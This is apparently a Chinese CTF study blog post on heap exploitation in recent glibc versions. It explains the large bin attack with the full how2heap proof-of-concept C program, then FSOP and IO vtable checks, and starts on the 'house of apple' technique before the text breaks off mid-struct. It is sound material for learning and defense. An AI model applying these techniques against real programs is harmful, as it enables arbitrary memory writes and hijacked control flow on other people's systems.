<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>猫猫&amp;&amp;苹果香蕉の屋 - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="
大古：一开始就用红色形态作战不就行了吗
" />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="猫猫&amp;&amp;苹果香蕉の屋" />
<meta property="og:description" content="
大古：一开始就用红色形态作战不就行了吗
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/%E7%8C%AB%E7%8C%AB--%E8%8B%B9%E6%9E%9C%E9%A6%99%E8%95%89-%E3%81%AE-%E5%B1%8B/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-11-02T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-11-02T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="猫猫&amp;&amp;苹果香蕉の屋"/>
<meta name="twitter:description" content="
大古：一开始就用红色形态作战不就行了吗
"/>
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
	

	
	
		<script type="text/javascript"
		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
		</script>

		
		<script type="text/x-mathjax-config">
		MathJax.Hub.Config({
			tex2jax: {
				inlineMath: [['$','$'], ['\\(','\\)']],
				displayMath: [['$$','$$'], ['\[','\]']],
				processEscapes: true,
				processEnvironments: true,
				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
				TeX: { equationNumbers: { autoNumber: "AMS" },
						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
			}
		});
		</script>
	

	
	
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>

		
		<script>
			document.addEventListener("DOMContentLoaded", function() {
					renderMathInElement(document.body, {
							delimiters: [
									{left: "$$", right: "$$", display: true},
									{left: "$", right: "$", display: false}
							]
					});
			});
			</script>
	

	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">ldrx30</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/about">About</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="http://localhost:1313/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">猫猫&amp;&amp;苹果香蕉の屋</h1>
			<div class="meta">Posted on Nov 2, 2023</div>
		</div>
		

		

		<section class="body">
			<blockquote>
<p>大古：一开始就用红色形态作战不就行了吗</p>
</blockquote>
<h2 id="前言">前言</h2>
<p><code>glibc</code> 高版本逐渐移除了<code>__malloc_hook/__free_hook/__realloc_hook</code> 等等一众 <code>hook</code> 全局变量。</p>
<p>利用手段向 IO_FILE 靠拢，但是随着版本越来越高，堆利用手段也变少，IO_FILE 的问题也逐渐减少。</p>
<h3 id="large-bin-attck">large bin attck</h3>
<p>一个范围的bin，保证了其内部有序性。在 <a href="https://xz.aliyun.com/t/5177">浅析largebin attack</a>文章中有张图方便理解
同样大小的bin按照free的时间顺序进行排序</p>
<ul>
<li>fd, bk: 相同大小堆的双向链表，按照时间先后排序</li>
<li>fd_nextsize, bk_nextsize: 大小不同的双向链表</li>
<li>如果只有一个，fd, bk指向 main_arena fd_nextsize 和 bk_nextsize 指向自己</li>
</ul>
<p>直接使用 how2heap 2.36 的 large bin attack 进行演示(Glibc &gt;= 2.30 都可以使用)。</p>
<ul>
<li>漏洞的点在开头的注释中给出，就是最后一句赋值语句导致的，victim(正在链入largebin)的size小于已经存在的bin</li>
<li>malloc两个大chunk p1,p2，两个 0x18 是防止 <strong>相邻的unsorted bin 合并</strong> 以及 <strong>被top_chunk合并</strong>。</li>
<li>这里注意的是：p1 的 size 大于 p2，但是不要差太多，在同一个largebin 里</li>
<li>free p1，将 p1 放入large bin 中</li>
<li>free p2，修改 p1 的 bk_nextsize 为 &amp;target-0x20</li>
<li>将 p2 放入largebin中</li>
<li>target 值就变成了 p2 的地址</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#include&lt;stdio.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include&lt;stdlib.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include&lt;assert.h&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">/*
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">A revisit to large bin attack for after glibc2.30
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">Relevant code snippet :
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	// 因为只有两个bin，因此可以解读一下。
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	// 看源码，bck是  bck = bin_at (av, victim_index);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	// av 就是 arena地址，bck就是找arena
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	// fwd = bck-&gt;fd;   与large bin 之间的双向链表，在这里就是存在的 p1
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) {
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">		fwd = bck;                                    // fwd = arena
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">		bck = bck-&gt;bk;                                // bck = p1
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">		victim-&gt;fd_nextsize = fwd-&gt;fd;                // vitim 要放入large bin 的堆 p2 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;   // victim.bk_nextsize = p1-&gt;bk_nextsize = &amp;target-0x20 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;  // p1.bk_nextsize = victim
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">		// 但是victim.bk_nextsize = &amp;target-0x20。而这个地址的 fd_nextsize = victim 也就是将 target 值改为 victim，
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	}
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/*Disable IO buffering to prevent stream from interfering with heap*/</span>
</span></span><span style="display:flex;"><span>  setvbuf(stdin,<span style="color:#8be9fd;font-style:italic">NULL</span>,_IONBF,<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>  setvbuf(stdout,<span style="color:#8be9fd;font-style:italic">NULL</span>,_IONBF,<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>  setvbuf(stderr,<span style="color:#8be9fd;font-style:italic">NULL</span>,_IONBF,<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Since glibc2.30, two new checks have been enforced on large bin chunk insertion</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Check 1 : </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;&gt;        malloc_printerr (</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">malloc(): largebin double linked list corrupted (nextsize)</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">);</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Check 2 : </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;&gt;    if (bck-&gt;fd != fwd)</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;&gt;        malloc_printerr (</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">malloc(): largebin double linked list corrupted (bk)</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">);</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;This prevents the traditional large bin attack</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;However, there is still one possible path to trigger large bin attack. The PoC is shown below : </span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;====================================================================</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  size_t target <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Here is the target we want to overwrite (%p) : %lu</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>,<span style="color:#ff79c6">&amp;</span>target,target);
</span></span><span style="display:flex;"><span>  size_t <span style="color:#ff79c6">*</span>p1 <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x428</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;First, we allocate a large chunk [p1] (%p)</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,p1<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>);
</span></span><span style="display:flex;"><span>  size_t <span style="color:#ff79c6">*</span>g1 <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x18</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;And another chunk to prevent consolidate</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  size_t <span style="color:#ff79c6">*</span>p2 <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x418</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;We also allocate a second large chunk [p2]  (%p).</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,p2<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;This chunk should be smaller than [p1] and belong to the same large bin.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  size_t <span style="color:#ff79c6">*</span>g2 <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x18</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Once again, allocate a guard chunk to prevent consolidate</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  free(p1);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Free the larger of the two --&gt; [p1] (%p)</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,p1<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>);
</span></span><span style="display:flex;"><span>  size_t <span style="color:#ff79c6">*</span>g3 <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x438</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Allocate a chunk larger than [p1] to insert [p1] into large bin</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  free(p2);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Free the smaller of the two --&gt; [p2] (%p)</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,p2<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;At this point, we have one chunk in large bin [p1] (%p),</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,p1<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;               and one chunk in unsorted bin [p2] (%p)</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,p2<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  p1[<span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">=</span> (size_t)((<span style="color:#ff79c6">&amp;</span>target)<span style="color:#ff79c6">-</span><span style="color:#bd93f9">4</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,(<span style="color:#ff79c6">&amp;</span>target)<span style="color:#ff79c6">-</span><span style="color:#bd93f9">4</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  size_t <span style="color:#ff79c6">*</span>g4 <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x438</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, p2<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>, p2<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;  the modified p1-&gt;bk_nextsize does not trigger any error</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, p2<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>, p1<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>, p2<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, p2<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>, (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)target);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Target (%p) : %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,<span style="color:#ff79c6">&amp;</span>target,(size_t<span style="color:#ff79c6">*</span>)target);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;====================================================================</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  assert((size_t)(p2<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>) <span style="color:#ff79c6">==</span> target);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>达到一个任意地址写成堆地址的目的。
Glibc 2.29 之前，unsortedbin attack 和 largebin attack 都是攻击 bk 指针，但是后来加了一句检查</p>
<p>在攻击时，fd,bk,fd_nextsize 可以随便覆盖内容，在经过malloc后会修复fd，因为fd指向 size 较小的 victim</p>
<h3 id="io-流">IO 流</h3>
<p>这里一般指 存在一条链，某个函数 使用 vtable 的函数指针来调用函数。</p>
<p>程序使用exit退出程序</p>
<ul>
<li>从main函数退出，glibc会调用exit</li>
<li>显示调用 exit 函数退出程序</li>
</ul>
<p>malloc_assert: house of kiwi 提出，触发下面的条件选一个</p>
<ul>
<li>topchunk的大小小于MINSIZE(0X20)</li>
<li>prev inuse位为0</li>
<li>old_top页未对齐</li>
<li>但是从libc 2.36 发生了一点变化，移除IO操作，也就是从libc 2.36不能使用</li>
<li>libc 2.37 直接没有这个函数了。</li>
</ul>
<p>libc 2.35：</p>
<ul>
<li>两个函数(fflsh, fxpeintf)都涉及IO操作。</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">static</span> <span style="color:#8be9fd">void</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">__malloc_assert</span> (<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>assertion, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>file, <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> line,
</span></span><span style="display:flex;"><span>		 <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>function)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  (<span style="color:#8be9fd">void</span>) __fxprintf (<span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#f1fa8c">&#34;%s%s%s:%u: %s%sAssertion `%s&#39; failed.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,
</span></span><span style="display:flex;"><span>		     __progname, __progname[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">?</span> <span style="color:#f1fa8c">&#34;: &#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>		     file, line,
</span></span><span style="display:flex;"><span>		     function <span style="color:#ff79c6">?</span> <span style="color:#8be9fd;font-style:italic">function</span> : <span style="color:#f1fa8c">&#34;&#34;</span>, function <span style="color:#ff79c6">?</span> <span style="color:#f1fa8c">&#34;: &#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>		     assertion);
</span></span><span style="display:flex;"><span>  fflush (stderr);
</span></span><span style="display:flex;"><span>  abort ();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="fsop">FSOP</h3>
<p>FSOP就是通过劫持_IO_list_all的值（如large bin attack修改）来执行_IO_flush_all_lockp函数，这个函数会根据_IO_list_all刷新链表中的所有文件流.</p>
<p>当程序从 main 函数返回或者执行 exit 函数的时候，均会调用 fcloseall 函数，调用链如下</p>
<ul>
<li>最后会遍历<code>_IO_list_all</code> 存放的每一个 <code>IO_FILE</code> 结构体</li>
<li>如果满足条件的话，会调用每个结构体中 <code>vtable-&gt;_overflow</code> 函数指针指向的函数。</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>exit
</span></span><span style="display:flex;"><span>	fcloseall
</span></span><span style="display:flex;"><span>		_IO_cleanup
</span></span><span style="display:flex;"><span>			_IO_flush_all_lockp
</span></span><span style="display:flex;"><span>				_IO_OVERFLOW
</span></span></code></pre></div><p>vtable 函数调用过程，就是调用跳表，比如说调用 <code>__overflow</code></p>
<ul>
<li><code>IO_validate_vtable</code>函数负责检查<code>vtable</code>的合法性，会判断<code>vtable</code>的地址是不是在一个合法的区间。如果<code>vtable</code>的地址不合法，程序将会异常终止。</li>
<li>最后就是调用 vtable 里面的函数</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))a
</span></span></span></code></pre></div><p>检查函数</p>
<ul>
<li>检查此结构体的 vtable 与 <code>__io_vtables</code> 全局变量表偏移</li>
<li>在这个表里的表就能通过检查。</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">static</span> <span style="color:#ff79c6">inline</span> <span style="color:#ff79c6">const</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_IO_jump_t</span> <span style="color:#ff79c6">*</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">IO_validate_vtable</span> (<span style="color:#ff79c6">const</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_IO_jump_t</span> <span style="color:#ff79c6">*</span>vtable)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  uintptr_t ptr <span style="color:#ff79c6">=</span> (uintptr_t) vtable;
</span></span><span style="display:flex;"><span>  uintptr_t offset <span style="color:#ff79c6">=</span> ptr <span style="color:#ff79c6">-</span> (uintptr_t) <span style="color:#ff79c6">&amp;</span>__io_vtables;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (__glibc_unlikely (offset <span style="color:#ff79c6">&gt;=</span> IO_VTABLES_LEN))
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">/* The vtable pointer is not in the expected section.  Use the
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">       slow path, which will terminate the process if necessary.  */</span>
</span></span><span style="display:flex;"><span>    _IO_vtable_check ();
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> vtable;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>所以现在劫持vtable都差不多在这个表里找一个能符合条件的表进行利用。</p>
<p>比如挟持到 <code>_wide_data</code> 相关的表，因为这个表含有vtable，并且函数调用没有检查。</p>
<ul>
<li>而与其相关的表有3个 找 <code>_IO_wfile_jumps</code> 开头的表存在三个</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define _IO_WIDE_JUMPS(THIS) \
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable
</span></span></span></code></pre></div><h2 id="house-of-apple">house of apple</h2>
<blockquote>
<p>有三个版本，这里是 version 2.0，控制函数执行流。</p>
</blockquote>
<ol>
<li>IO 流：exit 或者 malloc_assert</li>
<li>能泄露出 <code>heap</code> 地址和 <code>libc</code> 地址</li>
<li>能使用一次 <code>largebin attack</code>（一次即可）</li>
</ol>
<p>wide_data 结构体</p>
<ul>
<li>其中也存在一个 vtable</li>
<li>由上面的FSOP知道，在调用<code>_wide_vtable</code>虚表里面的函数时，同样是使用宏去调用，但是没有检查，因此更好利用</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_IO_wide_data</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> <span style="color:#ff79c6">*</span>_IO_read_ptr;    <span style="color:#6272a4">/* Current read pointer */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> <span style="color:#ff79c6">*</span>_IO_read_end;    <span style="color:#6272a4">/* End of get area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> <span style="color:#ff79c6">*</span>_IO_read_base;    <span style="color:#6272a4">/* Start of putback+get area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> <span style="color:#ff79c6">*</span>_IO_write_base;    <span style="color:#6272a4">/* Start of put area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> <span style="color:#ff79c6">*</span>_IO_write_ptr;    <span style="color:#6272a4">/* Current put pointer. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> <span style="color:#ff79c6">*</span>_IO_write_end;    <span style="color:#6272a4">/* End of put area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> <span style="color:#ff79c6">*</span>_IO_buf_base;    <span style="color:#6272a4">/* Start of reserve area. */</span>
